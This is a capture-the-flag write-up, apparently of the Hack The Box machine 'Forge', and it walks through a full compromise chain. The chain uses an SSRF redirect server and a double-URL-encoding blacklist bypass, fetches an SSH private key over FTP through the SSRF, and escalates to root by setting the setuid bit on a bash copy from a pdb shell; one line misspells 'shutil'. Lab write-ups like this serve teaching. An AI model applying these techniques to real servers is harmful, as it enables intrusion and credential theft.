> Author: **[NoobHacker9999][author-profile]**

## Discovery

### Port scanning

```bash
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41
|_http-title: Did not follow redirect to http://forge.htb
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
PORT      STATE         SERVICE
137/udp   filtered      netbios-ns
21902/udp filtered      unknown
23176/udp filtered      unknown
49173/udp open|filtered unknown
```

### Enumeration

Directories:

```
/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
/upload               (Status: 200) [Size: 929]
/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/]
/server-status        (Status: 403) [Size: 274]
```

Vhost:

```
admin.forge.htb
```

### Web browsing

#### forge.htb

The webserver has a single service: uploading an image. Trying an internet
served image results in:

```
An error occured! Error : HTTPSConnectionPool(host='avatars.githubusercontent.com', port=443): Max retries exceeded with url: /u/31746234?s=280&v=4
(Caused by NewConnectionError('<urllib3.connection.HTTPSConnection object at 0x7f85c3afa490>: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution'))
```

But we can serve an image on the vpn and upload it by URL:

![][successful-upload]

Since the server is making the request, it can reach beyond the filters. IE there's
potential for SSRF.

#### admin.forge.htb

The subdomain `admin.forge.htb` is not reachable:

```
Only localhost is allowed!
```

## Breaking-in the internal services

So we want the server to access the admin page and serve it back to us.

### By setting up a redirect

A service like Bitly doesn't work because the server is not connected to the
internet.

But the following script will redirect the incoming requests to the admin page:

```python
import http.server
import socketserver

class FakeRedirect(http.server.SimpleHTTPRequestHandler):
   def do_GET(self):
       self.send_response(301)
       self.send_header('Location', f'http://admin.forge.htb:80{self.path}')
       self.end_headers()

socketserver.TCPServer(("", 9999), FakeRedirect).serve_forever()
```

Then `http://1.2.3.4:9999/announcements` will be redirected to
`http://admin.forge.htb/announcements`. Since the server only filters the first
request.

### By tricking the blacklist filter

A single URL encoding doesn't fool the filter, but doing it twice:

```bash
curl -i -s -k -X $'POST' -H $'Host: forge.htb' \
    --data-binary $'url=http://%61%64%6d%69%6e%2e%66%6f%72%67%65%2e%68%74%62&remote=1' \
    $'http://forge.htb/upload'
# <strong>URL contains a blacklisted address!</strong>
curl -i -s -k -X $'POST' -H $'Host: forge.htb' \
    --data-binary $'url=http://%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%65%25%36%36%25%36%66%25%37%32%25%36%37%25%36%35%25%32%65%25%36%38%25%37%34%25%36%32&remote=1' \
    $'http://forge.htb/upload'
# <h1>
#     <center>
#         <strong>File uploaded successfully to the following url:</strong>
#     </center>
# </h1>
# <h1>
#     <center>
#         <strong><a href="http://forge.htb/uploads/7bwTmsOJJ9vFDVSJAaxW">http://forge.htb/uploads/7bwTmsOJJ9vFDVSJAaxW</strong>
#     </center>
# </h1>
```

### Accessing the internal content

#### Credential leaks

And following the link in the response gives:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>
```

Doing the same for `admin.forge.htb/annoucements/`:

```html
<ul>
    <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
    <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
    <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
</ul>
```

#### FTP server

The FTP port is filtered from the outside, but the former trick still works with:

```
http://10.10.16.34:9999/upload?u=ftp://user:heightofsecurity123!@10.10.11.111:21/.ssh/id_rsa
```

Try uploading:

```bash
curl -T www/shell.py http://forge.htb/uploads/Rc4dfaCvZ6MlGlxw5Uq9
```

### Scripting

The process has become tedious and is slowing the exploration of the server.
Let's script it:

```bash
redirect=$(curl -i -s -k -X $'POST' -H $'Content-Type: application/x-www-form-urlencoded' \
    --data-urlencode "url=http://1.2.3.4:9999/${1}" \
    --data-urlencode "remote=1" \
    $'http://forge.htb/upload' |
    perl -ne 'm#(http://forge.htb/uploads/[a-zA-Z0-9]+)#g && print $1')

curl $redirect
```

Then start the redirection script / server and accessing the FTP becomes easy:

```bash
./tunnel.sh $'upload?u=ftp://user:heightofsecurity123!@10.10.11.111:21/'
```

With this, we can browse & enumerate `admin.forge.htb`: the shared folder is
the home directory of `user` and the SSH key is accessible!

```bash
./tunnel.sh $'upload?u=ftp://user:heightofsecurity123!@10.10.11.111:21/.ssh/id_rsa' > user.id_rsa
```

## Escalation

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

Here's a choice cut of `/opt/remote-manage.py`:

```python
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
```

The pdb shell runs as root! It can be triggered by sending an invalid option (a character) to
the listening socket:

```python
option = int(clientsock.recv(1024).strip())
```

And from the pdb shell setuid a binary:

```python
import stat, os, shutil
chutil.copyfile("/usr/bin/bash", "/home/user/b")
os.chmod("/home/user/b", stat.S_ISUID |  stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
```

And run it.

[author-profile]: https://app.hackthebox.eu/users/393721
[blacklist]: images/blacklist.png
[successful-upload]: images/successful-upload.png
